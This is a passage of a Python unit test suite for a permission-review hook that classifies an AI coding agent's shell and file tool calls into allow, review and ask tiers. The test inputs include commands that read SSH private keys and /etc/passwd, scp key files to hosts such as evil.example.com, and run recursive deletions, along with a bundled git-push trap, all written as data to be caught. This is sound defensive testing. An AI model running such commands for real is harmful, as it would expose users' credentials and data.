            (
                "python3 - <<'PY'\nvals = [10, 20]\nprint(sum(vals) / 1000.0)\nPY",
                False,
            ),
            (
                "cat <<'EOF' > /tmp/notes.md\ndon't worry about /etc/hosts or 10/2.0\nEOF",
                False,
            ),
            ("sed '/debug/d' src/a.py", False),
            ("sed -i '' '/debug/d' src/a.py", False),
            ("awk '/error/ {print $1/1000}' src/app.log", False),
            ("/opt/homebrew/bin/gh api repos/org/repo/pulls/1 --jq '.items | length'", True),
            ("/opt/homebrew/bin/gh api repos/org/repo/pulls/1 --jq '.commits > 0'", True),
            ("/opt/homebrew/bin/uv run pytest 2>/dev/null", True),
            ("ls /workspace/project # don't break on apostrophe in comment", False),
        ]
        for cmd, bypass in fast_allow_cases:
            res = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_stdlib_ok",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": cmd, "BypassSandbox": bypass}},
                },
                api_caller=fail_api,
            )
            self.assertEqual(res["decision"], "allow", msg=f"Expected Tier 0 allow for {cmd!r}, got {res}")
            self.assertIn("Tier 0", res["reason"], msg=f"Expected Tier 0 reason for {cmd!r}, got {res}")

        # 2. Security upgrades & fail-closed boundaries (must reach Tier 2, never fast-allow at Tier 0)
        calls: list[dict] = []

        def capture_allow(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            calls.append(payload)
            return {"data": {"answers": [{"choice": "allow", "confidence": 0.96}]}}

        def capture_deny(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            calls.append(payload)
            return {"data": {"answers": [{"choice": "deny", "confidence": 0.97}]}}

        # Path.home() / ".ssh" / "id_ed25519" must be resolved by AST and caught by SENSITIVE_READ_PATHS
        calls.clear()
        res_ssh = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_stdlib_sec",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": (
                            'python3 -c \'from pathlib import Path; '
                            'print((Path.home() / ".ssh" / "id_ed25519").read_text())\''
                        ),
                        "BypassSandbox": False,
                    },
                },
            },
            api_caller=capture_deny,
        )
        self.assertEqual(res_ssh["decision"], "deny")
        self.assertEqual(len(calls), 1, msg="Path.home()/.ssh bypassed Tier 2!")

        # Path("/opt") / "ext_proj" / "a.py" hits Tier 2 on first call, then os.path.join hits session_dir_cache
        calls.clear()
        res_path_obj = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_stdlib_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": (
                            'python3 -c \'from pathlib import Path; '
                            'print((Path("/opt") / "ext_proj" / "a.py").read_text())\''
                        ),
                        "BypassSandbox": False,
                    },
                },
            },
            api_caller=capture_allow,
        )
        self.assertEqual(res_path_obj["decision"], "allow")
        self.assertEqual(len(calls), 1)

        res_join_cached = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_stdlib_cache",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": (
                            'python3 -c \'import os; '
                            'print(open(os.path.join("/opt", "ext_proj", "b.py")).read())\''
                        ),
                        "BypassSandbox": False,
                    },
                },
            },
            api_caller=capture_allow,
        )
        self.assertEqual(res_join_cached["decision"], "allow")
        self.assertEqual(len(calls), 1, msg="Expected os.path.join on approved dir to reuse session_dir_cache")

        # Remaining external path extraction & malformed fail-closed cases must reach Tier 2
        tier2_required = [
            'python3 -c \'open("/" + "etc/passwd")\'',
            'python3 -c \'name="a"; open(f"/opt/other_ext/{name}.py")\'',
            "sed '1w /outside/out.txt' src/a.py",
            'awk \'{print > "/outside/out.txt"}\' src/app.log',
            'cat "/outside/Folder With Spaces/secret.txt"',
            "ls ~",
            "cat < /outside/secret.txt",
            'echo "unterminated /outside/secret',
        ]
        for cmd in tier2_required:
            calls.clear()
            res_req = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_stdlib_req",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": cmd, "BypassSandbox": False}},
                },
                api_caller=capture_deny,
            )
            self.assertEqual(res_req["decision"], "deny", msg=f"Expected Tier 2 deny for {cmd!r}, got {res_req}")
            self.assertEqual(len(calls), 1, msg=f"{cmd!r} failed to escalate to Tier 2")

        # Quoted path with spaces stays intact in externalPaths rather than splitting on whitespace
        act_spaces = review_hook.build_requested_action(
            "run_command",
            {"CommandLine": 'cat "/outside/Folder With Spaces/secret.txt"', "BypassSandbox": False},
            workspace_paths=[ws],
            cwd=ws,
        )
        self.assertIn(os.path.normpath("/outside/Folder With Spaces/secret.txt"), act_spaces["details"]["externalPaths"])

        # 3. Cold-parse latency check: unique Tier-0 routine + inline python division commands average < 1.0 ms
        bench_cmds = [
            f"git status --short && ls {ws}/sub{idx} && python3 -c 'print(({idx}+10)/1000.0)'"
            for idx in range(25)
        ]
        intent_extractor.parse_shell_structure.cache_clear()
        intent_extractor._extract_python_code_paths_cached.cache_clear()
        t_start = time.perf_counter()
        for cmd in bench_cmds:
            res_b = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_stdlib_bench",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": cmd, "BypassSandbox": False}},
                },
                api_caller=fail_api,
            )
            self.assertEqual(res_b["decision"], "allow")
        avg_ms = ((time.perf_counter() - t_start) * 1000.0) / len(bench_cmds)
        self.assertLess(avg_ms, 1.0, msg=f"Average Tier 0 evaluation latency too high: {avg_ms:.3f} ms")

    def test_short_affirmation_context_bundled_push_guard_and_readonly_ssh_cache(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"

        local_cfg = self.tmp_path / "local_ssh.json"
        local_cfg.write_text(
            json.dumps({"known_ssh_hosts": ["DevBox"], "shared_hpc_hosts": ["cluster-login"]}),
            encoding="utf-8",
        )
        review_hook.os.environ["AGY_PERMISSION_REVIEWER_LOCAL_CONFIG"] = str(local_cfg)
        self.addCleanup(lambda: review_hook.os.environ.pop("AGY_PERMISSION_REVIEWER_LOCAL_CONFIG", None))

        tp = self.tmp_path / "gpu_bench_session.jsonl"
        rows: list[dict] = [
            {
                "step_index": 2,
                "type": "USER_INPUT",
                "content": "<USER_REQUEST>\nClone the solver setup and benchmark FluidSolver on the GPU if possible\n</USER_REQUEST>",
            },
            {
                "step_index": 6,
                "type": "USER_INPUT",
                "content": "<USER_REQUEST>\nPlease avoid /tmp for reusable test clones\n</USER_REQUEST>",
            },
            {
                "step_index": 10,
                "type": "USER_INPUT",
                "content": "<USER_REQUEST>\nOnly target my fork later once ready\n</USER_REQUEST>",
            },
            {
                "step_index": 14,
                "type": "USER_INPUT",
                "content": "<USER_REQUEST>\nUse Release flags when building CUDA kernels\n</USER_REQUEST>",
            },
            {
                "step_index": 19,
                "type": "PLANNER_RESPONSE",
                "content": (
                    "Local checks passed. Can I SSH into DevBox (testing in /home/dev/gpu_validation/full_stack_solver), "
                    "and push dev/FluidSolver if the GPU tests pass?"
                ),
            },
            {
                "step_index": 20,
                "type": "USER_INPUT",
                "content": "<USER_REQUEST>\nYes I've allowed it already.\n</USER_REQUEST>",
            },
        ]
        # Pad >300 KB of subsequent tool activity so the 256 KB compact tail scrolls past step 19-20.
        filler = "x" * 2400
        for s in range(21, 165):
            rows.append(
                {
                    "step_index": s,
                    "type": "PLANNER_RESPONSE",
                    "content": "",
                    "tool_calls": [{"name": "run_command", "args": {"CommandLine": f"echo {filler}"}}],
                }
            )
        tp.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")

        # 1. Ledger keeps the earlier task prompt (max_count=5) and anchors preceding agent question onto short "Yes"
        ledger = review_hook.collect_session_ledger(tp)
        recent = ledger["recent_user_messages"]
        self.assertEqual(len(recent), 5)
        self.assertIn("Clone the solver setup and benchmark FluidSolver", recent[0])
        self.assertTrue(recent[-1].startswith("[Agent context before reply (not user words):"))
        self.assertIn("DevBox", recent[-1])
        self.assertTrue(recent[-1].endswith("-> [User]: Yes I've allowed it already."))

        # 2. Agent text must NEVER self-mint Tier-1 path grants
        grant_paths = [pg["path"] for pg in ledger["path_grants"]]
        self.assertNotIn("/home/dev/gpu_validation/full_stack_solver", grant_paths)

        calls: list[dict] = []

        def capture_allow(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            calls.append(payload)
            return {"data": {"answers": [{"choice": "allow", "confidence": 0.95}]}}

        # 3. Mutating SSH commands hit Tier 2 (receiving anchored context + knownUserSshHost) and NEVER bypass via SSH cache
        res_ssh1 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_ssh_session",
                "workspacePaths": [ws],
                "transcriptPath": str(tp),
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": 'ssh -o ConnectTimeout=10 DevBox "wsl.exe --distribution Ubuntu --exec python3 /home/dev/test.py"',
                        "BypassSandbox": True,
                    },
                },
            },
            api_caller=capture_allow,
        )
        self.assertEqual(res_ssh1["decision"], "allow")
        self.assertEqual(len(calls), 1)
        req_json = calls[0]["input"][1]["value"]
        self.assertEqual(req_json["requested_action"]["details"]["sshHost"], "devbox")
        self.assertTrue(req_json["requested_action"]["details"]["knownUserSshHost"])
        self.assertNotIn("sharedHpcHost", req_json["requested_action"]["details"])

        act_cluster = review_hook.build_requested_action(
            "run_command",
            {"CommandLine": 'ssh cluster-login "ls $SCRATCH"', "BypassSandbox": True},
            workspace_paths=[ws],
            cwd=ws,
            ledger=ledger,
        )
        self.assertEqual(act_cluster["details"]["sshHost"], "cluster-login")
        self.assertTrue(act_cluster["details"]["knownUserSshHost"])
        self.assertTrue(act_cluster["details"]["sharedHpcHost"])
        self.assertTrue(
            any("DevBox" in m and "Yes I've allowed it already." in m for m in req_json["recent_user_messages"])
        )

        res_ssh2 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_ssh_session",
                "workspacePaths": [ws],
                "transcriptPath": str(tp),
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": 'ssh -o ConnectTimeout=10 DevBox "wsl.exe --distribution Ubuntu --exec tar -xzf - -C /home/dev/gpu_validation"',
                        "BypassSandbox": True,
                    },
                },
            },
            api_caller=capture_allow,
        )
        self.assertEqual(res_ssh2["decision"], "allow")
        self.assertEqual(len(calls), 2, msg="Mutating SSH tar must still be reviewed by Tier 2")

        # 4. Strictly read-only SSH grep on approved host hits session_ssh_readonly_cache (0 LLM calls)
        res_ro = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_ssh_session",
                "workspacePaths": [ws],
                "transcriptPath": str(tp),
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {
                        "CommandLine": 'ssh -o ConnectTimeout=10 DevBox "wsl.exe --distribution Ubuntu --exec grep -n error /home/dev/build.log"',
                        "BypassSandbox": True,
                    },
                },
            },
            api_caller=capture_allow,
        )
        self.assertEqual(res_ro["decision"], "allow")
        self.assertEqual(len(calls), 2, msg="Read-only SSH check should reuse session_ssh_readonly_cache")
        audit_lines = [
            json.loads(ln)
            for ln in (intent_extractor.get_data_dir() / "audit" / "c_ssh_session.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        self.assertEqual(audit_lines[-1]["tier"], "session_ssh_readonly_cache")

        # 5. Bundled-proposal trap: remote `git push` over SSH and nested `zsh -lc "gh pr create"` ALWAYS hit Tier 0 force_ask
        for trap_cmd in (
            'ssh DevBox "cd /home/dev/repo && git push origin dev/FluidSolver"',
            '/bin/zsh -lc "gh pr create --title test"',
        ):
            res_trap = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_ssh_session",
                    "workspacePaths": [ws],
                    "transcriptPath": str(tp),
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": trap_cmd, "BypassSandbox": True}},
                },
                api_caller=capture_allow,
            )
            self.assertEqual(res_trap["decision"], "ask", msg=f"Expected Tier 0 ask/force_ask for {trap_cmd!r}")
            self.assertEqual(review_hook.to_antigravity_hook_output(res_trap)["decision"], "force_ask")
        self.assertEqual(len(calls), 2)

    def test_security_tightenings_unsandboxed_py_script_rw_dir_cache_and_rm_recursive(self) -> None:
        review_hook.os.environ["AGY_REVIEWER_MODE"] = "opencode"
        ws = "/workspace/project"

        def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            raise AssertionError(f"Tier 2 should not run for safe Tier 0 command ({endpoint})")

        # 1. Sandboxed python3/uv *.py fast-allows at Tier 0, and module test runners remain routine even unsandboxed;
        #    arbitrary unsandboxed python3 /tmp/script.py and uv run python3 /tmp/script.py MUST escalate to Tier 2.
        for ok_cmd, bypass in (
            ("python3 /tmp/script.py", False),
            ("uv run python3 /tmp/script.py", False),
            ("python3 -m unittest discover -s tests", True),
            ("uv run pytest -q", True),
        ):
            r_ok = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_sec_t",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": ok_cmd, "BypassSandbox": bypass}},
                },
                api_caller=fail_api,
            )
            self.assertEqual(r_ok["decision"], "allow", msg=f"Expected Tier 0 allow for {ok_cmd!r} (bypass={bypass})")

        t2_calls: list[str] = []

        def allow_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            t2_calls.append(endpoint)
            return {"data": {"answers": [{"choice": "allow", "confidence": 0.95}]}}

        def deny_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
            t2_calls.append(endpoint)
            return {"data": {"answers": [{"choice": "deny", "confidence": 0.96}]}}

        for risky_cmd in ("python3 /tmp/script.py", "uv run python3 /tmp/script.py"):
            t2_calls.clear()
            r_risky = review_hook.evaluate_tool_call(
                {
                    "conversationId": "c_sec_py_deny",
                    "workspacePaths": [ws],
                    "cwd": ws,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": risky_cmd, "BypassSandbox": True}},
                },
                api_caller=deny_api,
            )
            self.assertEqual(r_risky["decision"], "deny")
            self.assertEqual(len(t2_calls), 1, msg=f"Unsandboxed {risky_cmd!r} bypassed Tier 2!")

        # 2. Mode-separated session_dir_cache: read approval caches read_file & git log, NEVER write_file/edit_file/git commit
        t2_calls.clear()
        r_read1 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sec_rw",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {"name": "read_file", "args": {"Path": "/opt/ext_repo/a.py"}},
            },
            api_caller=allow_api,
        )
        self.assertEqual(r_read1["decision"], "allow")
        self.assertEqual(len(t2_calls), 1)

        # Sibling read & read-only git log reuse read dir cache (0 extra Tier 2 calls)
        r_read2 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sec_rw",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {"name": "read_file", "args": {"Path": "/opt/ext_repo/b.py"}},
            },
            api_caller=allow_api,
        )
        self.assertEqual(r_read2["decision"], "allow")
        r_git_ro = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sec_rw",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": "git -C /opt/ext_repo log -n 5", "BypassSandbox": True},
                },
            },
            api_caller=allow_api,
        )
        self.assertEqual(r_git_ro["decision"], "allow")
        self.assertEqual(len(t2_calls), 1)

        # Write attempts (unsandboxed git commit denied once, edit_file approved) must NOT hit read cache
        r_git_mut = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sec_rw",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": 'git -C /opt/ext_repo commit -m "x"', "BypassSandbox": True},
                },
            },
            api_caller=deny_api,
        )
        self.assertEqual(r_git_mut["decision"], "deny")
        self.assertEqual(len(t2_calls), 2, msg="Read dir cache must NEVER auto-allow unsandboxed git commit!")

        r_edit1 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sec_rw",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {"name": "edit_file", "args": {"Path": "/opt/ext_repo/a.py"}},
            },
            api_caller=allow_api,
        )
        self.assertEqual(r_edit1["decision"], "allow")
        self.assertEqual(len(t2_calls), 3, msg="Read dir cache must NEVER auto-allow edit_file!")

        # Once write approval is granted on /opt/ext_repo, sibling write_file AND git commit reuse the write cache
        r_write2 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sec_rw",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {"name": "write_file", "args": {"Path": "/opt/ext_repo/b.py", "Content": "ok"}},
            },
            api_caller=allow_api,
        )
        self.assertEqual(r_write2["decision"], "allow")
        r_git_mut2 = review_hook.evaluate_tool_call(
            {
                "conversationId": "c_sec_rw",
                "workspacePaths": [ws],
                "cwd": ws,
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": 'git -C /opt/ext_repo commit -m "y"', "BypassSandbox": True},
                },
            },
            api_caller=allow_api,
        )
        self.assertEqual(r_git_mut2["decision"], "allow")
        self.assertEqual(len(t2_calls), 3)

        # 3. Long flags --recursive and --force escalate to Tier 2 as destructive
        for d_cmd in ("rm --recursive src/old_dir", "git rm --recursive src/old_dir", "git clean -d --force"):
            for bypass in (False, True):
                t2_calls.clear()
                res_d = review_hook.evaluate_tool_call(
                    {
                        "conversationId": "c_sec_dest",
                        "workspacePaths": [ws],
                        "cwd": ws,
                        "toolCall": {"name": "run_command", "args": {"CommandLine": d_cmd, "BypassSandbox": bypass}},
                    },
                    api_caller=deny_api,
                )
                self.assertEqual(res_d["decision"], "deny")
                self.assertEqual(len(t2_calls), 1, msg=f"{d_cmd!r} (bypass={bypass}) bypassed Tier 2!")
                act = review_hook.build_requested_action(
                    "run_command",
                    {"CommandLine": d_cmd, "BypassSandbox": bypass},
                    workspace_paths=[ws],
                    cwd=ws,
                )
                self.assertTrue(act["details"]["isDestructiveOrDelete"])

    def test_remote_transfer_host_tagging_and_mixed_host_safety(self) -> None:
        local_cfg = self.tmp_path / "local_transfer.json"
        local_cfg.write_text(
            json.dumps({"known_ssh_hosts": ["backup-host", "dev-workstation"], "shared_hpc_hosts": ["cluster-login"]}),
            encoding="utf-8",
        )
        review_hook.os.environ["AGY_PERMISSION_REVIEWER_LOCAL_CONFIG"] = str(local_cfg)
        self.addCleanup(lambda: review_hook.os.environ.pop("AGY_PERMISSION_REVIEWER_LOCAL_CONFIG", None))
        ws = "/workspace/project"

        act_win = review_hook.build_requested_action(
            "run_command",
            {
                "CommandLine": "scp /Users/alice/.config/backup/repo.key dev-workstation:/C:/Users/alice/.config/backup/repo.key",
                "BypassSandbox": True,
            },
            workspace_paths=[ws],
            cwd=ws,
        )
        self.assertEqual(act_win["details"].get("sshHost"), "dev-workstation")
        self.assertTrue(act_win["details"].get("knownUserSshHost"))
        self.assertNotIn("sharedHpcHost", act_win["details"])

        act_backup = review_hook.build_requested_action(
            "run_command",
            {
                "CommandLine": "scp -i ~/.ssh/mykey /Users/alice/.config/backup/repo.key backup-host:/srv/archives/repo.key",
                "BypassSandbox": True,
            },
            workspace_paths=[ws],
            cwd=ws,
        )
        self.assertEqual(act_backup["details"].get("sshHost"), "backup-host")
        self.assertEqual(act_backup["details"].get("remoteHosts"), ["backup-host"])
        self.assertTrue(act_backup["details"].get("knownUserSshHost"))

        act_hpc = review_hook.build_requested_action(
            "run_command",
            {
                "CommandLine": "rsync -az build/ cluster-login:/scratch/u/build/",
                "BypassSandbox": True,
            },
            workspace_paths=[ws],
            cwd=ws,
        )
        self.assertEqual(act_hpc["details"].get("sshHost"), "cluster-login")
        self.assertTrue(act_hpc["details"].get("sharedHpcHost"))
        self.assertTrue(act_hpc["details"].get("knownUserSshHost"))

        act_unknown = review_hook.build_requested_action(
            "run_command",
            {
                "CommandLine": "scp /tmp/a unknown-box:/tmp/x",
                "BypassSandbox": True,
            },
            workspace_paths=[ws],
            cwd=ws,
        )
        self.assertEqual(act_unknown["details"].get("sshHost"), "unknown-box")
        self.assertNotIn("knownUserSshHost", act_unknown["details"])

        act_mixed = review_hook.build_requested_action(
            "run_command",
            {
                "CommandLine": "scp /tmp/a backup-host:/tmp/a && scp /tmp/a evil.example.com:/tmp/a",
                "BypassSandbox": True,
            },
            workspace_paths=[ws],
            cwd=ws,
        )
        self.assertEqual(act_mixed["details"].get("remoteHosts"), ["backup-host", "evil.example.com"])
        self.assertNotIn("knownUserSshHost", act_mixed["details"])

        act_local_rsync = review_hook.build_requested_action(
            "run_command",
            {
                "CommandLine": "rsync -av ./local_dir /tmp/dest",
                "BypassSandbox": True,
            },
            workspace_paths=[ws],
            cwd=ws,
        )
        self.assertNotIn("remoteHosts", act_local_rsync["details"])
        self.assertNotIn("knownUserSshHost", act_local_rsync["details"])

    def test_cross_platform_launcher_windows_paths_and_opencode_exe_resolution(self) -> None:
        import ntpath
        import subprocess

        repo_root = Path(__file__).resolve().parents[1]
        hooks_cfg = json.loads((repo_root / "hooks.json").read_text(encoding="utf-8"))
        hook_cmd = hooks_cfg["context-permission-reviewer"]["PreToolUse"][0]["hooks"][0]["command"]
        self.assertEqual(hook_cmd, '"./scripts/run_hook.cmd"')

        # 1. Polyglot launcher works directly from plugin root via native shell on POSIX and Windows
        ws_path = r"C:\workspace\project" if os.name == "nt" else "/workspace/project"
        file_path = r"C:\workspace\project\src\a.py" if os.name == "nt" else "/workspace/project/src/a.py"
        hook_payload = json.dumps(
            {
                "conversationId": "c_launcher",
                "workspacePaths": [ws_path],
                "toolCall": {"name": "read_file", "args": {"Path": file_path}},
            }
        )
        env = dict(os.environ)
        env["PLUGIN_DATA"] = str(self.tmp_path / "launcher_data")
        proc = subprocess.run(
            hook_cmd if os.name == "nt" else ["/bin/sh", "-c", hook_cmd],
            shell=(os.name == "nt"),
            cwd=str(repo_root),
            input=hook_payload,
            text=True,
            capture_output=True,
            env=env,
            check=False,
        )
        self.assertEqual(proc.returncode, 0, msg=f"stderr={proc.stderr!r}")
        self.assertEqual(proc.stderr, "")
        parsed_out = json.loads(proc.stdout.strip())
        self.assertEqual(parsed_out["decision"], "auto_approve")

        # 2. Windows npm `.cmd` shim resolves to real PE `opencode.exe` and skips un-postinstalled text stubs
        npm_dir = self.tmp_path / "npm"
        shim = npm_dir / "opencode.cmd"
        exe = npm_dir / "node_modules" / "@opencode" / "cli" / "bin" / "opencode.exe"
        arch_exe = (
            npm_dir
            / "node_modules"
            / "@opencode"
            / "cli"
            / "node_modules"
            / "@opencode"
            / "cli-windows-x64"
            / "bin"
            / "opencode.exe"
        )
        shim.parent.mkdir(parents=True, exist_ok=True)
        exe.parent.mkdir(parents=True, exist_ok=True)
        arch_exe.parent.mkdir(parents=True, exist_ok=True)
        shim.write_text("@ECHO off\n", encoding="utf-8")
        exe.write_bytes(b'echo "Error: @opencode/cli postinstall did not run"\n')
        arch_exe.write_bytes(b"MZ_ARCH")
        self.assertEqual(llm_classifier._resolve_windows_opencode_exe(str(shim)), str(arch_exe))

        exe.write_bytes(b"MZ_TOP")
        self.assertEqual(llm_classifier._resolve_windows_opencode_exe(str(shim)), str(exe))

        # 3. `is_path_under` handles Windows backslashes, case-insensitivity, and drive roots
        with mock.patch.object(intent_extractor.os, "sep", "\\"), \
             mock.patch.object(intent_extractor.os.path, "normpath", side_effect=ntpath.normpath), \
             mock.patch.object(intent_extractor.os.path, "normcase", side_effect=ntpath.normcase):
            self.assertTrue(
                intent_extractor.is_path_under(r"C:\Users\Alice\proj\a.py", r"c:\users\alice\proj")
            )
            self.assertFalse(
                intent_extractor.is_path_under(r"C:\Users\Alice\proj2\a.py", r"C:\Users\Alice\proj")
            )
            self.assertTrue(
                intent_extractor.is_path_under(r"C:\Windows\System32\cmd.exe", "C:\\")
            )

        # 4. Windows drive-letter paths are extracted from strings and command arguments
        self.assertEqual(
            intent_extractor.extract_paths_from_string(r"C:\Users\alice\proj\a.py"),
            [os.path.normpath(r"C:\Users\alice\proj\a.py")],
        )
        self.assertIn(
            os.path.normpath(r"C:\Windows\System32\drivers\etc\hosts"),
            intent_extractor.extract_paths_from_string(r'open("C:\Windows\System32\drivers\etc\hosts")'),
        )


if __name__ == "__main__":
    unittest.main()
